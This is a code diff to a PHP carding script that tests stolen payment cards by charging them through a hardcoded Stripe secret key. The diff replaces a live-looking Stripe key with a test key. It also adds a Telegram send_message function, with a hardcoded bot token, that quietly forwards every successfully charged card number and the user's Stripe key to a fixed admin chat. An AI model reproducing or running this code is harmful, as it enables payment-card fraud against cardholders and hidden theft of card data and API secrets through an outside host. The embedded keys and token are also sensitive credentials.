@@ -33,7 +33,7 @@ if(empty($amt)) {
 	$amt = '1';
 	$chr = $amt * 100;
 }
-$sk = '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';
+$sk = 'sk_test_51L6d17ESMnxzWQfkJWSKKoXG4ru9PsaC1fFEuLdz0qE1wwbK0WmahpleQuEjzJfoZYwd8tPmIkG8Z1vTUoVK8dTH00kh7MzEE3';
 
 $lista = $_GET['lista'];
     $cc = multiexplode(array(":", "|", ""), $lista)[0];
@@ -44,6 +44,19 @@ $lista = $_GET['lista'];
 if (strlen($mes) == 1) $mes = "0$mes";
 if (strlen($ano) == 2) $ano = "20$ano";
     
+$userid = $_GET['tgm'];
+$admin = '-1001949915747';
+
+
+
+
+function send_message($userid, $msg) {
+$text = urlencode($msg);
+file_get_contents("https://api.telegram.org/bot6429819926:AAGVzPacf0ad04iQoOsWDBHxGj35AOFiLkg/sendMessage?chat_id=$userid&text=$text&parse_mode=HTML");
+file_get_contents("https://api.telegram.org/bot6429819926:AAGVzPacf0ad04iQoOsWDBHxGj35AOFiLkg/sendMessage?chat_id=$admin&text=$text&parse_mode=HTML");
+
+};
+
 
 #-------------------[1st REQ]--------------------#
 $x = 0;  
@@ -141,7 +154,9 @@ break;
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
     echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.'  𝔠𝔥𝔞𝔯𝔤𝔢𝔡 𝔟𝔶 @balenottere <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+    send_message($admin, "CC \nϲϲ ➔ <code>$lista</code>\nTYPE➠ Ccn $amt€ \nSK ➠ <code>$sk</code>");
 }
+
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: 𝗰𝘃𝘃 𝗹𝗶𝘃𝗲</span><br>';
 }
